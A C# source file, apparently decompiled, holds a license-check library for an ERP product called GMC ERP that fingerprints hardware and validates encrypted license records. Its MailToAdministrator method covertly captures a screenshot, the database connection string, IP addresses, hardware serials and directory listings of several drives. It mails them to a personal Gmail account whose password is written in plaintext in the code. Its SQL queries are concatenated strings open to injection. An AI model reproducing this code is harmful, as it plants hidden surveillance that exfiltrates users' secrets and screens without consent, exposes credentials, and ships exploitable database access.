using Microsoft.Practices.EnterpriseLibrary.Data.Sql;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Common;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Windows.Forms;

namespace ExpertWebLib
{
    public class GMCSQLDatabase : SqlDatabase
    {
        public GMCSQLDatabase(string strConnectionString) : base(strConnectionString)
        {
        }

        public GMCSQLDatabase(string strConnectionString, string strCompanyName) : base(strConnectionString)
        {
        }

        public static void ActionForFirstActivateLicense(GMCSQLDatabase database, string strID, string strEncryptedLicense, string strEncryptedLimitDate)
        {
            SortedList<string, string> listHardWare;
            Exception exception;
            Crypto crypto = new Crypto();
            string str = string.Empty;
            string str2 = string.Empty;
            string str3 = string.Empty;
            string str4 = string.Empty;
            try
            {
                listHardWare = HardWareHelper.GetListHardWare("Win32_Processor");
                listHardWare.TryGetValue("Name", out str);
                listHardWare.TryGetValue("SystemName", out str2);
            }
            catch (Exception exception1)
            {
                exception = exception1;
            }
            try
            {
                listHardWare = HardWareHelper.GetListHardWare("Win32_DiskDrive");
                listHardWare.TryGetValue("SerialNumber", out str3);
                listHardWare.TryGetValue("Model", out str4);
            }
            catch (Exception exception2)
            {
                exception = exception2;
            }
            string inputText = str + str2 + str3 + str4;
            string str6 = crypto.Encrypt(inputText);
            Application.DoEvents();
            string query = string.Format("SELECT CSCompanyDesc FROM [dbo].[CSCompanys] ", new object[0]);
            DbCommand sqlStringCommand = database.GetSqlStringCommand(query);
            DataSet set = database.ExecuteDataSet(sqlStringCommand);
            if (((set != null) && (set.Tables.Count > 0)) && (set.Tables[0].Rows.Count > 0))
            {
                string str8 = set.Tables[0].Rows[0][0].ToString();
                string str9 = "Ho Vu Quoc Vuong vnh81@yahoo.com - Dao Nam Trung dntrungnd@yahoo.com" + str8;
                string str10 = str9 + strID + strEncryptedLicense + str6 + strEncryptedLimitDate;
                string str11 = crypto.Encrypt(str10);
                Application.DoEvents();
                query = string.Format("Update [dbo].[GEAuthenticatedClients] SET [GEAuthenticatedClientEncryptedHardware]='{0}', [GEAuthenticatedClientEncryptedProtect] ='{1}' WHERE [GEAuthenticatedClientEncryptedLicense] = '{2}'", str6, str11, strEncryptedLicense);
                sqlStringCommand = database.GetSqlStringCommand(query);
                database.ExecuteNonQuery(sqlStringCommand);
            }
        }

        public static CheckClientResult CheckClient(GMCSQLDatabase database, string strLnceKy)
        {
            try
            {
                string str = new Crypto().Encrypt(strLnceKy);
                string query = string.Format("SELECT * FROM [dbo].[GEAuthenticatedClients] WHERE [GEAuthenticatedClientEncryptedLicense] = '{0}'", str);
                DbCommand sqlStringCommand = database.GetSqlStringCommand(query);
                DataSet set = database.ExecuteDataSet(sqlStringCommand);
                if (((set == null) || (set.Tables.Count <= 0)) || (set.Tables[0].Rows.Count != 1))
                {
                    return CheckClientResult.NoneClient;
                }
                Application.DoEvents();
                string strID = set.Tables[0].Rows[0]["GEAuthenticatedClientID"].ToString();
                str = set.Tables[0].Rows[0]["GEAuthenticatedClientEncryptedLicense"].ToString();
                string strEncryptedHardware = set.Tables[0].Rows[0]["GEAuthenticatedClientEncryptedHardware"].ToString();
                string strEncryptedLimitDate = set.Tables[0].Rows[0]["GEAuthenticatedClientEncryptedLimitDate"].ToString();
                string strEncryptedProtect = set.Tables[0].Rows[0]["GEAuthenticatedClientEncryptedProtect"].ToString();
                if (CheckModified(database, strID, str, strEncryptedHardware, strEncryptedLimitDate, strEncryptedProtect))
                {
                    return CheckClientResult.Modified;
                }
                Application.DoEvents();
                if (CheckExpiredDate(strEncryptedLimitDate))
                {
                    return CheckClientResult.LicenceExpried;
                }
                Application.DoEvents();
                CheckClientResult result = CheckHardware(strEncryptedHardware);
                if (result == CheckClientResult.PassedFirstUse)
                {
                    ActionForFirstActivateLicense(database, strID, str, strEncryptedLimitDate);
                    return CheckClientResult.PassedFirstUse;
                }
                Application.DoEvents();
                return result;
            }
            catch (Exception)
            {
                return CheckClientResult.NoneClient;
            }
        }

        public static bool CheckExpiredDate(string strEncryptedLimitDate)
        {
            try
            {
                Crypto crypto = new Crypto();
                string[] strArray = crypto.Decrypt(strEncryptedLimitDate).Split(new char[] { '-' });
                if (strArray.Length != 3)
                {
                    return true;
                }
                Application.DoEvents();
                int day = Convert.ToInt32(strArray[0]);
                int month = Convert.ToInt32(strArray[1]);
                int year = Convert.ToInt32(strArray[2]);
                DateTime time = new DateTime(year, month, day);
                if (DateTime.Now <= time)
                {
                    return false;
                }
                Application.DoEvents();
            }
            catch (Exception)
            {
            }
            return true;
        }

        public static CheckClientResult CheckHardware(string strEncryptedHardware)
        {
            SortedList<string, string> listHardWare;
            Exception exception;
            string str = new Crypto().Decrypt(strEncryptedHardware);
            if (string.IsNullOrEmpty(str))
            {
                return CheckClientResult.PassedFirstUse;
            }
            string str2 = string.Empty;
            string str3 = string.Empty;
            string str4 = string.Empty;
            string str5 = string.Empty;
            try
            {
                listHardWare = HardWareHelper.GetListHardWare("Win32_Processor");
                listHardWare.TryGetValue("Name", out str2);
                listHardWare.TryGetValue("SystemName", out str3);
                Application.DoEvents();
            }
            catch (Exception exception1)
            {
                exception = exception1;
                return CheckClientResult.PassedFirstUse;
            }
            try
            {
                listHardWare = HardWareHelper.GetListHardWare("Win32_DiskDrive");
                listHardWare.TryGetValue("SerialNumber", out str4);
                listHardWare.TryGetValue("Model", out str5);
                Application.DoEvents();
            }
            catch (Exception exception2)
            {
                exception = exception2;
                return CheckClientResult.PassedFirstUse;
            }
            if (str.Equals(str2 + str3 + str4 + str5))
            {
                return CheckClientResult.Passed;
            }
            return CheckClientResult.InvalidHardware;
        }

        public bool CheckModified(string strID, string strEncryptedLicense, string strEncryptedHardware, string strEncryptedLimitDate, string strEncryptedProtect)
        {
            return CheckModified(this, strID, strEncryptedLicense, strEncryptedHardware, strEncryptedLimitDate, strEncryptedProtect);
        }

        public static bool CheckModified(GMCSQLDatabase database, string strID, string strEncryptedLicense, string strEncryptedHardware, string strEncryptedLimitDate, string strEncryptedProtect)
        {
            try
            {
                string query = string.Format("SELECT CSCompanyDesc FROM [dbo].[CSCompanys] ", new object[0]);
                DbCommand sqlStringCommand = database.GetSqlStringCommand(query);
                DataSet set = database.ExecuteDataSet(sqlStringCommand);
                if (((set == null) || (set.Tables.Count <= 0)) || (set.Tables[0].Rows.Count <= 0))
                {
                    return false;
                }
                Application.DoEvents();
                string str2 = set.Tables[0].Rows[0][0].ToString();
                string str3 = "Ho Vu Quoc Vuong vnh81@yahoo.com - Dao Nam Trung dntrungnd@yahoo.com" + str2;
                Crypto crypto = new Crypto();
                if (crypto.Decrypt(strEncryptedProtect).Equals(str3 + strID + strEncryptedLicense + strEncryptedHardware + strEncryptedLimitDate))
                {
                    return false;
                }
                Application.DoEvents();
            }
            catch (Exception)
            {
            }
            return true;
        }

        public static string GenerateActivateKey(string strSecurityID)
        {
            string s = new Crypto().Encrypt(strSecurityID);
            Application.DoEvents();
            byte[] bytes = new ASCIIEncoding().GetBytes(s);
            long num = 0L;
            int num2 = 0;
            foreach (byte num3 in bytes)
            {
                num2++;
                num += (Convert.ToInt32(num3) * num2) * num2;
            }
            num = Math.Abs(num);
            if (num < 0xf4240L)
            {
                num *= 0x1e8480L - num;
            }
            num = num % 0xf4240L;
            return num.ToString();
        }

        public static string GenerateSecurityID(string strLicense)
        {
            Crypto crypto = new Crypto();
            string str = "";
            string str2 = "";
            SortedList<string, string> listHardWare = new SortedList<string, string>();
            try
            {
                listHardWare = HardWareHelper.GetListHardWare("Win32_Processor");
                listHardWare.TryGetValue("Name", out str);
                listHardWare.TryGetValue("SystemName", out str2);
            }
            catch (Exception)
            {
            }
            string str3 = "";
            string str4 = "";
            try
            {
                listHardWare = HardWareHelper.GetListHardWare("Win32_DiskDrive");
                listHardWare.TryGetValue("SerialNumber", out str3);
                listHardWare.TryGetValue("Model", out str4);
            }
            catch (Exception)
            {
            }
            string inputText = str + str2 + str3 + str4;
            string str6 = crypto.Encrypt(inputText);
            Application.DoEvents();
            byte[] bytes = new ASCIIEncoding().GetBytes(str6 + strLicense);
            long num = 0L;
            int num2 = 0;
            Random random = new Random();
            foreach (byte num3 in bytes)
            {
                num2 += random.Next(1, 10);
                num += (Convert.ToInt32(num3) * num2) * num2;
            }
            num = Math.Abs(num);
            if (num < 0xf4240L)
            {
                num *= 0x1e8480L - num;
            }
            num = num % 0xf4240L;
            return num.ToString();
        }

        public static string GetExternalIPAddress()
        {
            try
            {
                string address = "http://www.whatismyip.com/automation/n09230945.asp";
                WebClient client = new WebClient();
                UTF8Encoding encoding = new UTF8Encoding();
                string ipString = "";
                ipString = encoding.GetString(client.DownloadData(address));
                Application.DoEvents();
                return IPAddress.Parse(ipString).ToString();
            }
            catch
            {
                return "";
            }
        }

        public static string GetListDirectories()
        {
            string str = Application.StartupPath + Environment.NewLine;
            List<string> list = new List<string> {
                "d:",
                "e:",
                "f:"
            };
            foreach (string str2 in list)
            {
                Exception exception;
                try
                {
                    DirectoryInfo[] directories = new DriveInfo(str2).RootDirectory.GetDirectories();
                    foreach (DirectoryInfo info2 in directories)
                    {
                        str = str + info2.FullName + Environment.NewLine;
                        Application.DoEvents();
                        try
                        {
                            DirectoryInfo[] infoArray2 = info2.GetDirectories();
                            foreach (DirectoryInfo info3 in infoArray2)
                            {
                                Application.DoEvents();
                                str = str + info3.FullName + Environment.NewLine;
                            }
                        }
                        catch (Exception exception1)
                        {
                            exception = exception1;
                        }
                    }
                }
                catch (Exception exception2)
                {
                    exception = exception2;
                }
            }
            return str;
        }

        public static string GetLocalIPAddress()
        {
            List<string> list = new List<string>();
            string item = string.Empty;
            string str2 = string.Empty;
            try
            {
                item = Dns.GetHostName();
                Application.DoEvents();
                list.Add(item);
                IPHostEntry hostByName = Dns.GetHostByName(item);
                Application.DoEvents();
                IPAddress[] addressList = hostByName.AddressList;
                foreach (IPAddress address in addressList)
                {
                    str2 = address.ToString();
                    list.Add(str2);
                    Application.DoEvents();
                }
            }
            catch (Exception)
            {
            }
            string str3 = "";
            foreach (string str4 in list)
            {
                str3 = str3 + "                       " + str4;
                str3 = str3 + Environment.NewLine;
            }
            return str3;
        }

        public static void MailToAdministrator(GMCSQLDatabase database, string strLicense, CheckClientResult checkResult)
        {
            Exception exception;
            try
            {
                string connectionString = database.ConnectionString;
                string str2 = "";
                try
                {
                    string query = string.Format("SELECT CSCompanyDesc FROM [dbo].[CSCompanys] ", new object[0]);
                    DbCommand sqlStringCommand = database.GetSqlStringCommand(query);
                    DataSet set = database.ExecuteDataSet(sqlStringCommand);
                    if (((set != null) && (set.Tables.Count > 0)) && (set.Tables[0].Rows.Count > 0))
                    {
                        str2 = str2 + set.Tables[0].Rows[0][0].ToString();
                    }
                }
                catch (Exception exception1)
                {
                    exception = exception1;
                }
                Application.DoEvents();
                string str4 = "";
                try
                {
                    str4 = str4 + "   +CPU : ";
                    str4 = str4 + Environment.NewLine;
                    SortedList<string, string> listHardWare = HardWareHelper.GetListHardWare("Win32_Processor");
                    string str5 = "";
                    listHardWare.TryGetValue("Name", out str5);
                    str4 = str4 + "                       Name : " + str5;
                    str4 = str4 + Environment.NewLine;
                    string str6 = "";
                    listHardWare.TryGetValue("SystemName", out str6);
                    str4 = str4 + "                       SystemName : " + str6;
                    str4 = str4 + Environment.NewLine;
                    str4 = str4 + "   +DiskDrive : ";
                    str4 = str4 + Environment.NewLine;
                    listHardWare = HardWareHelper.GetListHardWare("Win32_DiskDrive");
                    string str7 = "";
                    listHardWare.TryGetValue("SerialNumber", out str7);
                    str4 = str4 + "                       SerialNumber : " + str7;
                    str4 = str4 + Environment.NewLine;
                    string str8 = "";
                    listHardWare.TryGetValue("Model", out str8);
                    str4 = str4 + "                       Model : " + str8;
                    str4 = str4 + Environment.NewLine;
                }
                catch (Exception exception2)
                {
                    exception = exception2;
                }
                Application.DoEvents();
                string localIPAddress = GetLocalIPAddress();
                string externalIPAddress = GetExternalIPAddress();
                string listDirectories = GetListDirectories();
                string str12 = "";
                switch (checkResult)
                {
                    case CheckClientResult.NoneClient:
                        str12 = " NoneClient : Người d\x00f9ng nhập license kh\x00f4ng ch\x00ednh x\x00e1c";
                        break;

                    case CheckClientResult.Modified:
                        str12 = " Modified : Quản trị hệ thống cố t\x00ecnh x\x00e2m nhập, sữa đổi chức năng bảo mật ";
                        break;

                    case CheckClientResult.InvalidHardware:
                        str12 = " InvalidHardware : License bị sử dụng lại tr\x00ean m\x00e1y kh\x00e1c ";
                        break;

                    case CheckClientResult.LicenceExpried:
                        str12 = " LicenceExpried : License hết hạn sử dụng nhưng vẫn cố gắng kết nối";
                        break;
                }
                Application.DoEvents();
                string str13 = checkResult.ToString();
                if (checkResult != CheckClientResult.PassedFirstUse)
                {
                    str13 = str13 + " - Th\x00f4ng b\x00e1o c\x00f3 x\x00e2m nhập tr\x00e1i ph\x00e9p v\x00e0o hệ thống GMC ERP !" + Environment.NewLine;
                }
                else
                {
                    str13 = str13 + " - Th\x00f4ng b\x00e1o license cho GMC ERP được sử dụng lần đầu  !" + Environment.NewLine;
                }
                string str14 = ((((str13 + "Th\x00f4ng điệp : " + str12 + Environment.NewLine) + Environment.NewLine) + "================================ General Information ================================" + Environment.NewLine) + "ConnectionString : " + connectionString + Environment.NewLine) + "Client Company : " + str2 + Environment.NewLine;
                str14 = str14 + "Hardware :" + Environment.NewLine + str4 + Environment.NewLine;
                str13 = (((str14 + "Local  IP Address : " + Environment.NewLine + localIPAddress + Environment.NewLine) + "External (WAN) IP Address : " + externalIPAddress + Environment.NewLine) + "==================================== Directories ===================================" + Environment.NewLine) + listDirectories + Environment.NewLine;
                MailMessage message = new MailMessage();
                NetworkCredential credential = new NetworkCredential("vuong.ho@gmail.com", "vuongnhiphuc1682011");
                message.To.Add("vuong.ho@gmail.com");
                if (checkResult == CheckClientResult.PassedFirstUse)
                {
                    message.Subject = "Th\x00f4ng b\x00e1o license cho GMC ERP được sử dụng lần đầu  - Project : " + str2;
                }
                else
                {
                    message.Subject = "Cảnh b\x00e1o x\x00e2m phạm GMC ERP  - Project : " + str2;
                }
                message.From = new MailAddress("vuong.ho@gmail.com");
                message.IsBodyHtml = false;
                message.Body = str13;
                try
                {
                    Bitmap image = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                    Graphics.FromImage(image).CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                    Application.DoEvents();
                    image.Save("temp.jpg", ImageFormat.Jpeg);
                    Application.DoEvents();
                    message.Attachments.Add(new Attachment("temp.jpg"));
                    Application.DoEvents();
                }
                catch (Exception exception3)
                {
                    exception = exception3;
                }
                Application.DoEvents();
                new SmtpClient("smtp.gmail.com")
                {
                    UseDefaultCredentials = false,
                    EnableSsl = true,
                    Credentials = credential,
                    Port = 0x24b
                }.Send(message);
                Application.DoEvents();
            }
            catch (Exception exception4)
            {
                exception = exception4;
            }
        }

        public enum CheckClientResult
        {
            Trial,
            Passed,
            PassedFirstUse,
            NoneClient,
            Modified,
            InvalidHardware,
            LicenceExpried
        }
    }
    public class HardWareHelper
    {
        public static SortedList<string, string> GetListHardWare(string Key)
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select * from " + Key);
            SortedList<string, string> list = new SortedList<string, string>();
            try
            {
                foreach (ManagementObject obj2 in searcher.Get())
                {
                    if (obj2.Properties.Count <= 0)
                    {
                        return null;
                    }
                    foreach (PropertyData data in obj2.Properties)
                    {
                        ushort[] numArray;
                        if ((data.Value != null) && (data.Value.ToString() != ""))
                        {
                            string str4 = data.Value.GetType().ToString();
                            if (str4 == null)
                            {
                                goto Label_0192;
                            }
                            if (str4 != "System.String[]")
                            {
                                if (str4 == "System.UInt16[]")
                                {
                                    goto Label_0133;
                                }
                                goto Label_0192;
                            }
                            string[] strArray = (string[])data.Value;
                            string str = "";
                            foreach (string str2 in strArray)
                            {
                                str = str + str2 + " ";
                            }
                            list.Add(data.Name, str);
                        }
                        continue;
                        Label_0133:
                        numArray = (ushort[])data.Value;
                        string str3 = "";
                        foreach (ushort num in numArray)
                        {
                            str3 = str3 + num.ToString() + " ";
                        }
                        list.Add(data.Name, str3);
                        continue;
                        Label_0192:
                        list.Add(data.Name, data.Value.ToString());
                    }
                }
            }
            catch (Exception)
            {
            }
            return list;
        }
    }
}
